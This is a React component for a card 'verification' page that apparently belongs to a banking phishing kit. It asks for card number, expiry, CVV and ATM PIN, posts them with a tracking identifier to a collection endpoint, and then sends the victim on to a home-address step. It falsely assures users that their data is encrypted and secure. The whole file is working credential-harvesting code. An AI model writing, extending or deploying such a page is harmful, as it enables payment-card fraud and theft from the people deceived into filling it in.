import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const Card: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [atmPin, setAtmPin] = useState('');
  const [showCvv, setShowCvv] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    atmPin: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  if (!emzemz) {
    return <div>Missing user details. Please restart the process.</div>;
  }

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    const groups = digitsOnly.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digitsOnly;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const cardDigits = cardNumber.replace(/\s/g, '');
    const newErrors = {
      cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
      expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
      cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/logix-card-info/`, {
          emzemz,
          cardNumber: cardDigits,
          expiryMonth,
          expiryYear,
          cvv,
          atmPin
        });
        console.log('Card information submitted successfully');
        navigate('/home-address', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting card info:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error. Please try again.'
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Card Information</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="text-sm text-gray-700 text-center mb-8">
          Please provide your card details for verification purposes.
        </p>

        <form onSubmit={handleSubmit} className="max-w-lg mx-auto space-y-4">
          {/* Card Number */}
          <div className="mb-4">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">Card Number:</label>
              <input
                id="cardNumber"
                name="cardNumber"
                type="text"
                value={cardNumber}
                onChange={handleCardNumberChange}
                maxLength={19}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
                placeholder="1234 5678 9012 3456"
              />
            </div>
            {errors.cardNumber && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.cardNumber}
              </div>
            )}
          </div>

          {/* Expiry Date */}
          <div className="mb-4">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">Expiry Date:</label>
              <div className="flex gap-2">
                <select
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  className="border border-gray-300 px-2 py-1 text-sm rounded"
                >
                  <option value="">Month</option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                      {String(i + 1).padStart(2, '0')}
                    </option>
                  ))}
                </select>
                <select
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  className="border border-gray-300 px-2 py-1 text-sm rounded"
                >
                  <option value="">Year</option>
                  {years.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>
            </div>
            {errors.expiry && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.expiry}
              </div>
            )}
          </div>

          {/* CVV */}
          <div className="mb-4">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">CVV:</label>
              <input
                id="cvv"
                name="cvv"
                type={showCvv ? 'text' : 'password'}
                value={cvv}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  if (value.length <= 4) setCvv(value);
                }}
                maxLength={4}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
                placeholder="123"
              />
              <span
                className="text-blue-700 text-sm hover:underline cursor-pointer"
                onClick={() => setShowCvv(!showCvv)}
              >
                {showCvv ? 'Hide' : 'Show'}
              </span>
            </div>
            {errors.cvv && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.cvv}
              </div>
            )}
          </div>

          {/* ATM PIN */}
          <div className="mb-6">
            <div className="flex items-center gap-4">
              <label className="text-gray-700 w-32 text-right">ATM PIN:</label>
              <input
                id="atmPin"
                name="atmPin"
                type={showPin ? 'text' : 'password'}
                value={atmPin}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  if (value.length <= 4) setAtmPin(value);
                }}
                maxLength={4}
                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
                placeholder="****"
              />
              <span
                className="text-blue-700 text-sm hover:underline cursor-pointer"
                onClick={() => setShowPin(!showPin)}
              >
                {showPin ? 'Hide' : 'Show'}
              </span>
            </div>
            {errors.atmPin && (
              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {errors.atmPin}
              </div>
            )}
          </div>

          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
            )}
          </div>
        </form>
      </div>

      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
        <p className="text-xs text-gray-600">
          Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
        </p>
      </div>
    </div>
  );
};

export default Card;
